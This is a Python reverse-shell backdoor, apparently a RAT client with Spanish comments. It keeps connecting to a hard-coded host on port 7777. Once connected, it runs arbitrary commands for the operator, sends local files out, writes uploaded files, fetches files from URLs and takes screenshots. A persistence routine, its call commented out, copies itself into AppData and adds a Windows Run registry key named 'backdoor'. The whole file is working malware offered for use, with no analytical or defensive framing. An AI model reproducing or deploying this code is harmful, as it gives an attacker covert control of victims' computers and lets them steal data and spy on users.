#!/usr/bin/env/python
#_*_coding: utf8_*_
import socket
import os
import subprocess
import base64
import requests
import mss
import os
import shutil
import time

def connect_to_server(host, port):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((host, port))
            print("Conectado al servidor")
            return client_socket
        except socket.error as e:
            print(f"Fallo al conectar, reintentando en 5 segundos... Error: {e}")
            time.sleep(5)      

def create_persistence():
    location = os.environ['appdata']+'\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "'+location+'"',shell=True)

def download_file_url(url):
    query = requests.get(url)
    fileName= url.split("/")[-1]
    with open(fileName,"wb") as file_downloaded_url:
        file_downloaded_url.write(query.content)

def take_screenshot():
    with mss.mss() as sct:
        screenshot = sct.shot(output="temp_screenshot.png")
        with open("temp_screenshot.png", "rb") as file:
            encoded_screenshot = base64.b64encode(file.read())
    return encoded_screenshot

def shell(client):
    current_dir = os.getcwd()
    client.send(current_dir.encode())
    try:
        while True:
            res = client.recv(1024).decode()
            if res == "exit":
                break
            elif res[:2] == "cd" and len(res) > 2:
                try:
                    os.chdir(res[3:])
                    result = os.getcwd()
                except FileNotFoundError:
                    result = f"Error: Directory '{res[3:]}' does not exist."
                except Exception as e:
                    result = f"Error: {str(e)}"
                client.send(result.encode())
            elif res[:8] == "download":
                with open(res[9:], "rb") as file_download:
                    client.send(base64.b64encode(file_download.read()))
            elif res[:6] == "upload":
                file_path = res[7:]
                print(f"Recibiendo: {file_path}")
                try:
                    with open(file_path, "wb") as file_upload:
                        while True:
                            data = client.recv(4096)
                            if data == b'EOF':
                                print("EOF received")
                                break
                            # Eliminar el '\n' antes de decodificar
                            file_upload.write(base64.b64decode(data.strip()))
                        print("File received successfully")
                except Exception as e:
                    print(f"File upload failed: {e}")


            elif res[:4] == "wget":
                try:
                    print(f"Command to download from internet {res[:4]}")
                    download_file_url(res[4:])
                    client.send("File downloaded success!".encode())
                except Exception as e:
                    client.send(f"File error download! {e}".encode())
            elif res[:10] == "screenshot":
                try:
                    screenshot_data = take_screenshot()
                    client.send(screenshot_data)
                    os.remove("temp_screenshot.png")
                except Exception as e:
                    client.send(f"Screenshot failed: {e}\n".encode())
            else:
                proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                if len(result) == 0:
                    client.send("1".encode())
                else:
                    client.send(result)
    except socket.error as e:
        print(f"Error connection: {e}")
    finally:
        try:
            client.close()
        except Exception as e:
            print(f"Error al cerrar el socket: {e}")

# create_persistence()
while True:
        client = connect_to_server('192.168.100.68',7777)
        shell(client)
        time.sleep(5)
